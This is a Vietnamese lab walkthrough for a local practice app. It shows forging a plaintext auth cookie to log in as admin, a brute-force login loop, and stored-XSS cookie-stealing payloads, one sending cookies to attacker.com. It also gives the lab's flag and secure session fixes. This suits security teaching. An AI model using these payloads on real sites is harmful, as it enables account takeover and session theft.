# 🎯 Authentication Bypass Lab

Hướng dẫn chi tiết về Authentication Bypass Lab - khai thác lỗ hổng xác thực và session management.

## 📍 Truy Cập Lab

```
http://localhost:3000/lab/auth
```

## 🎯 Mục Tiêu

1. **Đăng nhập** với tài khoản user bình thường
2. **Phát hiện** lỗ hổng cookie không an toàn
3. **Bypass** authentication để đăng nhập admin
4. **Đọc** comment bí mật và lấy FLAG

## 👥 Tài Khoản Hệ Thống

| Username | Password  | Role          |
| -------- | --------- | ------------- |
| admin    | admin123  | Administrator |
| user1    | password1 | User          |
| user2    | password2 | User          |

## 🧪 Các Bước Thực Hành

### Bước 1: Đăng Nhập Bình Thường

Sử dụng tài khoản test:

```
Username: user1
Password: password1
```

**Kết quả**: Đăng nhập thành công, thấy bảng tin với comments

### Bước 2: Kiểm Tra Cookie

1. Mở **DevTools** (F12)
2. Vào tab **Application** (hoặc **Storage**)
3. Chọn **Cookies** → `http://localhost:3000`
4. Tìm cookie tên **`auth`**

**Phát hiện**: Cookie có giá trị dạng `user1:password1` (plaintext!)

### Bước 3: Phân Tích Lỗ Hổng

Cookie có vấn đề:

-   ❌ Lưu `username:password` rõ ràng
-   ❌ `httpOnly: false` → có thể đọc/sửa bằng JavaScript
-   ❌ Không mã hóa, không hash
-   ❌ Server chỉ parse cookie, không verify với database

### Bước 4: Bypass Authentication

#### Cách 1: Sửa Cookie trong DevTools

1. Trong DevTools, double-click vào giá trị cookie `auth`
2. Sửa thành: `admin:admin123`
3. Refresh trang (F5)

**Kết quả**: Đăng nhập với tài khoản admin!

#### Cách 2: Sử dụng JavaScript Console

Mở Console trong DevTools và chạy:

```javascript
document.cookie = "auth=admin:admin123; path=/";
location.reload();
```

#### Cách 3: Sử dụng curl

```bash
curl -H "Cookie: auth=admin:admin123" http://localhost:3000/lab/auth
```

### Bước 5: Lấy FLAG 🚩

Sau khi đăng nhập với admin:

-   Xem bảng tin
-   Tìm comment từ admin (background vàng)
-   FLAG sẽ ở trong comment của admin

**FLAG**: `FLAG{4uth_Byp4ss_C00k13_H4ck}`

## 🔍 Phân Tích Kỹ Thuật

### Code Vulnerable

```javascript
// src/controllers/AuthController.js - KHÔNG AN TOÀN

// Login - Set cookie
const authCookie = `${username}:${password}`;
res.cookie("auth", authCookie, {
    maxAge: COOKIE_MAX_AGE,
    httpOnly: false, // ❌ Có thể đọc/sửa bằng JavaScript
});

// Verify - Chỉ parse cookie, không check database
const authCookie = req.cookies.auth;
const [username] = authCookie.split(":");
// Sử dụng username mà không verify!
```

### Tại Sao Có Lỗ Hổng?

1. **Plaintext Storage**: Lưu username:password rõ ràng
2. **No Verification**: Không verify session với database
3. **httpOnly: false**: Có thể sửa bằng JavaScript
4. **No Encryption**: Không mã hóa cookie

### Cách Khai Thác

**Input**: Cookie = `admin:admin123`

**Server xử lý**:

```javascript
const [username] = "admin:admin123".split(":");
// username = "admin"
// Server tin là đã đăng nhập với admin!
```

**Kết quả**: Bypass authentication thành công!

## 🧪 Các Payload Khác

### Đăng Nhập Với Bất Kỳ Tài Khoản Nào

```javascript
// Trong Console
document.cookie = "auth=user1:password1; path=/";
document.cookie = "auth=user2:password2; path=/";
document.cookie = "auth=admin:admin123; path=/";
```

### Brute Force Tìm Tài Khoản Admin

```bash
# Thử các username phổ biến
for user in admin root administrator; do
  for pass in admin admin123 password 123456; do
    curl -s -X POST http://localhost:3000/api/login \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"$user\",\"password\":\"$pass\"}" | grep success
  done
done
```

### Giả Mạo Cookie Bất Kỳ

```javascript
// Không cần biết password thật!
document.cookie = "auth=admin:fakepassword123; path=/";
// Vẫn sẽ hiển thị username là "admin"
```

## 🎯 Kỹ Thuật Nâng Cao: Stored XSS + Session Hijacking

### Bước 6: Stored XSS Attack

**Mục tiêu**: Chèn script vào comment để tấn công những người xem sau

1. Đăng nhập với user1
2. Post comment với payload XSS:

```html
<script>
    alert(document.cookie);
</script>
```

3. Khi admin (hoặc user khác) vào xem comment → Script thực thi!

### Bước 7: Session Hijacking (Đánh Cắp Cookie)

**Payload để đánh cắp cookie**:

```html
<script>
    fetch("/api/steal?cookie=" + document.cookie);
</script>
```

**Hoặc với external server**:

```html
<script>
    document.location =
        "http://localhost:3000/api/steal?cookie=" + document.cookie;
</script>
```

**Quy trình tấn công**:

1. Attacker (user1) post comment với XSS payload
2. Admin vào xem comment
3. Script thực thi trên trình duyệt của admin
4. Cookie của admin được gửi đến `/api/steal`
5. Attacker xem log để lấy cookie admin
6. Attacker dùng cookie đó để giả mạo admin

### Bước 8: Xem Stolen Cookies

Sau khi admin vào xem comment, check console của server:

```bash
🚨 STOLEN COOKIE RECEIVED:
Timestamp: 2025-10-16T...
Cookie: auth=admin:admin123
IP: ::1
User-Agent: Mozilla/5.0...
```

Hoặc xem trong bảng comments (sẽ có entry `[HACKER-LOG]`)

## 🛡️ Cách Phòng Chống

### ❌ KHÔNG AN TOÀN

```javascript
// Lưu username:password vào cookie
res.cookie("auth", `${username}:${password}`);
```

### ✅ AN TOÀN hơn - Sử dụng Session

```javascript
const session = require("express-session");

app.use(
    session({
        secret: "your-secret-key",
        resave: false,
        saveUninitialized: false,
        cookie: {
            httpOnly: true, // Không thể đọc bằng JavaScript
            secure: true, // Chỉ gửi qua HTTPS
            maxAge: 900000,
        },
    })
);

// Login
req.session.userId = user.id;
req.session.username = user.username;

// Verify
if (req.session.userId) {
    // Đã đăng nhập
    // Có thể verify lại với database
}
```

### ✅ TỐT HƠN - JWT (JSON Web Token)

```javascript
const jwt = require("jsonwebtoken");

// Login - Tạo token
const token = jwt.sign(
    { userId: user.id, username: user.username },
    "secret-key",
    { expiresIn: "1h" }
);
res.cookie("token", token, { httpOnly: true });

// Verify - Xác thực token
const token = req.cookies.token;
const decoded = jwt.verify(token, "secret-key");
// decoded.userId, decoded.username
```

### ✅ TỐT NHẤT - Kết Hợp Nhiều Lớp Bảo Vệ

```javascript
// 1. Session với database
// 2. JWT với signature
// 3. httpOnly: true
// 4. secure: true (HTTPS)
// 5. SameSite cookie
// 6. CSRF token
// 7. Rate limiting
// 8. Password hashing (bcrypt)
```

## 🎓 XSS Payloads Mẫu

### 1. Basic Alert

```html
<script>
    alert("XSS");
</script>
<script>
    alert(document.cookie);
</script>
```

### 2. Cookie Stealer

```html
<script>
    fetch("/api/steal?cookie=" + document.cookie);
</script>
```

### 3. External Server (Real Attack)

```html
<script>
    var img = new Image();
    img.src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>
```

### 4. Obfuscated XSS

```html
<img src="x" onerror="fetch('/api/steal?cookie='+document.cookie)" />
```

### 5. DOM-based XSS

```html
<svg onload="fetch('/api/steal?cookie='+document.cookie)"></svg>
```

## ⚠️ Nguy Hiểm Trong Thực Tế

### 1. Account Takeover

```
Attacker giả mạo cookie → Đăng nhập tài khoản nạn nhân
→ Đánh cắp dữ liệu, thay đổi thông tin
```

### 2. Privilege Escalation

```
User bình thường → Sửa cookie thành admin
→ Có quyền admin trên hệ thống
```

### 3. Data Breach

```
Bypass authentication → Truy cập dữ liệu nhạy cảm
→ Tải xuống database, customer info
```

### 4. Session Hijacking (XSS)

```
1. Attacker post XSS payload trong comment
2. Admin vào xem comment → Script thực thi
3. Cookie admin bị đánh cắp
4. Attacker dùng cookie để đăng nhập admin
```

### 5. Mass Account Takeover

```
1. XSS trong trang public (comment, profile)
2. Mọi user vào xem → Cookie bị đánh cắp
3. Attacker có database đầy đủ session tokens
```

## 🔧 Debugging Tips

### Xem Cookie Trong DevTools

-   Application → Cookies → http://localhost:3000
-   Xem giá trị cookie `auth`
-   Thử sửa giá trị và refresh

### Test với curl

```bash
# Login
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password1"}'

# Bypass với cookie
curl -H "Cookie: auth=admin:admin123" http://localhost:3000/lab/auth
```

### Browser DevTools

-   Network tab để xem requests
-   Console để debug JavaScript
-   Application tab để xem cookies

## 🚩 FLAG

```
FLAG{4uth_Byp4ss_C00k13_H4ck}
```

## 📚 Tài Liệu Tham Khảo

-   [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
-   [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
-   [JWT Best Practices](https://tools.ietf.org/html/rfc8725)

---

**Độ khó**: Trung bình - Nâng cao  
**Thời gian**: 20-40 phút  
**Yêu cầu**: Kiến thức về web security và session management
